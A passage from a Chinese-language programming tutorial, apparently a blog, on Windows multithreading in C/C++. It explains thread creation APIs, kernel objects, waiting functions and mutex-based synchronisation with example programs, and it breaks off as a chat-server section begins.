class="comment">//threadidentifier</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"><span class="comment">//第一个参数 lpThreadAttributes 表示线程内核对象的安全属性，一般传入NULL表示使用默认设置。</span></span></span><br><span class="line"><span class="function"><span class="comment">//第二个参数 dwStackSize 表示线程栈空间大小。传入0表示使用默认大小（1MB）。</span></span></span><br><span class="line"><span class="function"><span class="comment">//第三个参数 lpStartAddress 表示新线程所执行的线程函数地址，多个线程可以使用同一个函数地址。</span></span></span><br><span class="line"><span class="function"><span class="comment">//第四个参数 lpParameter 是传给线程函数的参数。</span></span></span><br><span class="line"><span class="function"><span class="comment">//第五个参数 dwCreationFlags 指定额外的标志来控制线程的创建</span></span></span><br><span class="line"><span class="function"><span class="comment">//------为0表示线程创建之后立即就可以进行调度；</span></span></span><br><span class="line"><span class="function"><span class="comment">//------如果为CREATE_SUSPENDED则表示线程创建后暂停运行，这样它就无法调度，直到调用ResumeThread()</span></span></span><br><span class="line"><span class="function"><span class="comment">//第六个参数 lpThreadId 将返回线程的ID号，传入NULL表示不需要返回该线程ID号</span></span></span><br></pre></td></tr></table></figure><p>另一个线程创建函数【更常用】：<code>_beginthread</code> / <code>_beginthreadex</code>【常用后者】</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="comment">//返回值:成功返回新线程句柄， 失败返回0</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> _beginthreadex(</span><br><span class="line">    <span class="type">void</span> *security,  <span class="comment">// 安全属性， 为NULL时表示默认安全性</span></span><br><span class="line">    <span class="type">unsigned</span> stack_size,  <span class="comment">// 线程的堆栈大小， 一般默认为0</span></span><br><span class="line">    <span class="built_in">unsigned</span>(_stdcall *start_address)(<span class="type">void</span> *),  <span class="comment">// 线程函数</span></span><br><span class="line">    <span class="type">void</span> *argilist, <span class="comment">// 线程函数的参数</span></span><br><span class="line">    <span class="type">unsigned</span> initflag,  <span class="comment">// 新线程的初始状态，0表示立即执行，//CREATE_SUSPENDED表示创建之后挂起</span></span><br><span class="line">    <span class="type">unsigned</span> *threaddr  <span class="comment">// 用来接收线程ID,使用NULL表示不接收</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><blockquote><p><code>__stdcall</code>表示</p><ul><li>参数从右向左压入堆栈</li><li>函数被调用者修改堆栈</li></ul></blockquote><p><strong>线程编码示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadFun</span><span class="params">(LPVOID p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> iMym = (<span class="type">int</span>)p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我是子线程，PID = %d,iMym = %d\n&quot;</span>, <span class="built_in">GetCurrentThreadId</span>(), iMym);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main begin\n&quot;</span>);</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwThreadID;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> m = <span class="number">100</span>;</span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadFun, &amp;m, <span class="number">0</span>, &amp;dwThreadID);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我是主线程，PID = %d\n&quot;</span>, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="6-3-简单多线程示例"><a href="#6-3-简单多线程示例" class="headerlink" title="6.3 简单多线程示例"></a>6.3 简单多线程示例</h3><h4 id="6-3-1-理解内核对象"><a href="#6-3-1-理解内核对象" class="headerlink" title="6.3.1 理解内核对象"></a>6.3.1 理解内核对象</h4><p>定义：<strong>内核对象</strong>通过API来创建，每个内核对象是一个数据结构，它对应一块内存，由操作系统内核分配，并且只能由操作系统内核访问。</p><ul><li>在此数据结构中少数成员【如安全描述符 <code>security</code>、使用计数】是所有对象都有的，但其他大多数成员都是不同类型的对象特有的。</li><li>内核对象的数据结构只能由操作系统提供的API访问，应用程序在内存中不能访问。</li><li>调用创建内核对象的函数后，该函数会返回一个句柄，它标识了所创建的对象。它可以由进程的任何线程使用。<ul><li>CreateProcess</li><li>CreateThread</li><li>CreateFile</li><li>event</li><li>Job</li><li>Mutex</li></ul></li></ul><p>常见的内核对象 : 进程、线程、文件，存取符号对象、事件对象、文件对象、作业对象、互斥对象、管道对象、等待计时器对象，邮件槽对象，信号对象</p><p><strong>内核对象</strong>：为了管理线程/文件等资源而由操作系统创建的数据块，其创建的所有者肯定是操作系统。</p><h4 id="6-3-2-举例"><a href="#6-3-2-举例" class="headerlink" title="6.3.2 举例"></a>6.3.2 举例</h4><p>🔺第一个例子：主线程和子线程的结束时间【main函数返回后，整个进程终止，同时终止其包含的所有线程】</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadFun</span><span class="params">(LPVOID p)</span><span class="comment">//DWORD：unsigned long </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> iMym = *(<span class="type">int</span>*)p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我是子线程，PID = %d,iMym = %d\n&quot;</span>, <span class="built_in">GetCurrentThreadId</span>(), iMym);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; iMym; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sleep\n&quot;</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main begin\n&quot;</span>);</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwThreadID;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> m = <span class="number">100</span>;</span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadFun, &amp;m, <span class="number">0</span>, &amp;dwThreadID);<span class="comment">//入口函数的取地址符&amp;，可加可不加</span></span><br><span class="line">    <span class="keyword">if</span> (hThread == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;CreateThread() error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我是主线程，PID = %d\n&quot;</span>, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">10000</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);<span class="comment">//注释后报错，因为主线程已结束，子线程还在继续</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>🔺第二个例子：<code>WaitForSingleObject()</code>【来等待一个内核对象变为已通知状态】</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//主线程会阻塞在此处，直到等待时间到或子线程执行结束</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(</span><br><span class="line">  _In_ HANDLE hHandle,      <span class="comment">//指明一个内核对象的句柄</span></span><br><span class="line">  _In_ DWORD dwMilliseconds <span class="comment">//等待时间</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadFun</span><span class="params">(LPVOID p)</span><span class="comment">//DWORD：unsigned long </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> iMym = *(<span class="type">int</span>*)p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我是子线程，PID = %d,iMym = %d\n&quot;</span>, <span class="built_in">GetCurrentThreadId</span>(), iMym);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; iMym; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sleep\n&quot;</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main begin\n&quot;</span>);</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwThreadID;</span><br><span class="line">    DWORD wr;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> m = <span class="number">10</span>;</span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadFun, &amp;m, <span class="number">0</span>, &amp;dwThreadID);<span class="comment">//入口函数的取地址符&amp;，可加可不加</span></span><br><span class="line">    <span class="keyword">if</span> (hThread == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;CreateThread() error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我是主线程，PID = %d\n&quot;</span>, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;*****************begin WaitForSingleObject\n&quot;</span>);</span><br><span class="line">    <span class="comment">//主线程会阻塞在此处，直到等待时间到或子线程执行结束</span></span><br><span class="line">    <span class="keyword">if</span> ((wr = <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE)) == WAIT_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;thread wait error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;*****************end WaitForSingleObject\n&quot;</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);<span class="comment">//注释后报错，因为主线程已结束，子线程还在继续</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>🔺第三个例子：起两个线程，一个加+1，一个减1【前面还是单子线程，下面是多线程示例】【线程同步】</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WaitForMultipleObjects</span>(</span><br><span class="line">    _In_ DWORD nCount,                            <span class="comment">// 要监测的句柄的组的句柄的个数</span></span><br><span class="line">    _In_reads_(nCount) CONST HANDLE* lpHandles, <span class="comment">//要监测的句柄的组</span></span><br><span class="line">    _In_ BOOL bWaitAll,  <span class="comment">// TRUE等待所有的内核对象发出信号， FALSE 任意一个内核对象发出信号</span></span><br><span class="line">    _In_ DWORD dwMilliseconds                     <span class="comment">//等待时间</span></span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_THREAD 50</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadInc</span><span class="params">(<span class="type">void</span>* p)</span><span class="comment">//LPVOID：void*</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        num += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadDec</span><span class="params">(<span class="type">void</span>* p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        num -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main begin\n&quot;</span>);</span><br><span class="line">    HANDLE hHandles[NUM_THREAD];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sizeof(long long):%d\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">long</span> <span class="type">long</span>));<span class="comment">//8字节</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUM_THREAD; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span>)</span><br><span class="line">            hHandles[i] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadInc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            hHandles[i] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadDec, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;*****************begin WaitForSingleObject\n&quot;</span>);</span><br><span class="line">    <span class="comment">//主线程会阻塞在此处，直到等待时间到或子线程执行结束</span></span><br><span class="line">    <span class="built_in">WaitForMultipleObjects</span>(NUM_THREAD, hHandles, TRUE, INFINITE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num=%d\n&quot;</span>, num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;*****************end WaitForSingleObject\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);<span class="comment">//注释后报错，因为主线程已结束，子线程还在继续</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>执行结果：没有加入线程，必然没有确定的答案。</p></blockquote><br><h3 id="6-4-线程同步与互斥对象"><a href="#6-4-线程同步与互斥对象" class="headerlink" title="6.4 线程同步与互斥对象"></a>6.4 线程同步与互斥对象</h3><p>互斥对象(<code>mutex</code>)属于内核对象，它能够确保线程拥有对单个资源的互斥访问权。</p><p>互斥对象包含一个使用数量，一个线程ID和一个计数器。其中，线程ID用于标识系统中的哪个线程当前拥有互斥对象，计数器用于指明该线程拥有互斥对象的次数。</p><ul><li>创建互斥对象：调用函数<code>CreateMutex</code>。调用成功，该函数返回所创建的互斥对象的句柄。</li><li>请求互斥对象所有权：调用函数<code>WaitForSingleObject</code>函数。线程必须主动请求共享对象的所有权才能获得所有权。</li><li>释放指定互斥对象的所有权：调用<code>ReleaseMutex</code>函数。线程访问共享资源结束后，线程要主动释放对互斥对象的所有权，使该对象处于已通知状态。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//CreateMutex</span></span><br><span class="line"><span class="built_in">CreateMutexW</span>(</span><br><span class="line">    _In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes,   <span class="comment">//指向安全属性</span></span><br><span class="line">    _In_ BOOL bInitialOwner,   <span class="comment">//初始化互斥对象的所有者  TRUE 立即拥有互斥体，false表示创建的这个mutex不属于任何线程；所以处于激发状态，也就是有信号状态</span></span><br><span class="line">    _In_opt_ LPCWSTR lpName    <span class="comment">//指向互斥对象名的指针  L“Bingo”，可以默认NULL无名</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>示例：在上节代码中添加最简单的PV操作，即<code>WaitForSingleObject</code> / <code>ReleaseMutex</code> 操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_THREAD 50</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> num = <span class="number">0</span>;</span><br><span class="line">HANDLE hMutex;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadInc</span><span class="params">(<span class="type">void</span>* p)</span><span class="comment">//LPVOID：void*</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        num += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadDec</span><span class="params">(<span class="type">void</span>* p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        num -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main begin\n&quot;</span>);</span><br><span class="line">    HANDLE hHandles[NUM_THREAD];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建互斥量</span></span><br><span class="line">    hMutex = <span class="built_in">CreateMutexW</span>(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sizeof(long long):%d\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">long</span> <span class="type">long</span>));<span class="comment">//8字节</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUM_THREAD; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span>)</span><br><span class="line">            hHandles[i] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadInc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            hHandles[i] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadDec, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;*****************begin WaitForSingleObject\n&quot;</span>);</span><br><span class="line">    <span class="comment">//主线程会阻塞在此处，直到等待时间到或子线程执行结束</span></span><br><span class="line">    <span class="built_in">WaitForMultipleObjects</span>(NUM_THREAD, hHandles, TRUE, INFINITE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num=%d\n&quot;</span>, num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;*****************end WaitForSingleObject\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);<span class="comment">//注释后报错，因为主线程已结束，子线程还在继续</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：此处的<code>WaitForSingleObject</code> 等待的是互斥量的内核对象；上节等待的线程的内核对象。</p><br><h3 id="6-5-多线程实现QQ群聊"><a href="#6-5-多线程实现QQ群聊" class="headerlink" title="6.5 多线程实现QQ群聊"></a>6.5 多线程实现QQ群聊</h3><p>📋服务端</p><ul><li>多线程 + socket编程</li><li>用互斥体进行线程同步 临界区 全局变量</li></ul><p>📋服务端的设计：</p><ol><li>每来一个连接，服务端起一个线程维护</li><li>将收到的消息转发给所有的客户端</li><li>某个连接断开，需要处理断开的连接</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span 